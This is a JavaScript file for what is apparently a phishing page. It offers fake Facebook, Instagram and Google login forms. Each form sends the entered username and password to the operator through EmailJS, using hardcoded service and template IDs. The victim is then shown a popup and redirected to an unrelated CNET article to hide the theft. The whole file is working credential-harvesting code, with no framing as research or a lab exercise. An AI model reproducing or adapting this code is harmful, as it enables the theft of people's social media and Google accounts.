var but1=document.getElementsByTagName("button")[0]
var but2=document.getElementsByTagName("button")[1]
var but3=document.getElementsByTagName("button")[2]

var cont1=document.getElementsByClassName("label")[0]
var cont2=document.getElementsByClassName("label")[1]
var cont3=document.getElementsByClassName("label")[2]

var input=document.getElementsByTagName("input")

var sub1=document.getElementsByClassName("submit")[0]
var sub2=document.getElementsByClassName("submit")[1]
var sub3=document.getElementsByClassName("submit")[2]





const servicerID= "service_rycqwq2"
const tempID="template_976pvho"
let params = {
    username:"username",
    password:"password"
  }

   
      





but1.addEventListener('click',()=>{
    cont1.classList.remove('hide')
    cont2.classList.add('hide')
    cont3.classList.add('hide')
})
but2.addEventListener('click',()=>{
    cont1.classList.add('hide')
    cont2.classList.remove('hide')
    cont3.classList.add('hide')
})
but3.addEventListener('click',()=>{
    cont1.classList.add('hide')
    cont2.classList.add('hide')
    cont3.classList.remove('hide')
})

sub1.addEventListener('click',()=>{
    if(input[0].value==="" ||input[1].value===""){
        if(input[0].value===""){
            input[0].classList.add("erro")
        }
        if(input[1].value===""){
            input[1].classList.add("erro")
        }
      }else{
          params={
              nameOfMethode:"facebook",
              username:input[0].value,
              password:input[1].value
          }
          console.log(params);
          emailjs.send(servicerID,tempID,params).then(
            function (res){
                document.getElementsByClassName("popup")[0].classList.add('scale')
                  setTimeout(()=>{
                     window.location.href="https://www.cnet.com/tech/computing/plug-versus-plug/"
               },4000)
               }
                )
      }
})
sub2.addEventListener('click',()=>{
    console.log("click");

    if(input[2].value==="" ||input[3].value===""){
        if(input[2].value===""){
            input[2].classList.add("erro")
        }
        if(input[3].value===""){
            input[3].classList.add("erro")
        }
      }else{
          params={
              nameOfMethode:"instagram",
              username:input[2].value,
              password:input[3].value
          }
         console.log(params);
         
          emailjs.send(servicerID,tempID,params).then(
              function (res){
               document.getElementsByClassName("popup")[0].classList.add('scale')
                 setTimeout(()=>{
                    window.location.href="https://www.cnet.com/tech/computing/plug-versus-plug/"
              },4000)
              }
                )
      }
})
sub3.addEventListener('click',()=>{
    if(input[4].value==="" ||input[5].value===""){
        if(input[4].value===""){
            input[4].classList.add("erro")
        }
        if(input[5].value===""){
            input[5].classList.add("erro")
        }
      }else{
          params={
              nameOfMethode:"google",
              username:input[4].value,
              password:input[5].value
          }
          console.log(params);
          emailjs.send(servicerID,tempID,params).then(
            function (res){
                document.getElementsByClassName("popup")[0].classList.add('scale')
                  setTimeout(()=>{
                     window.location.href="https://www.cnet.com/tech/computing/plug-versus-plug/"
               },4000)
               }
                )
      }
})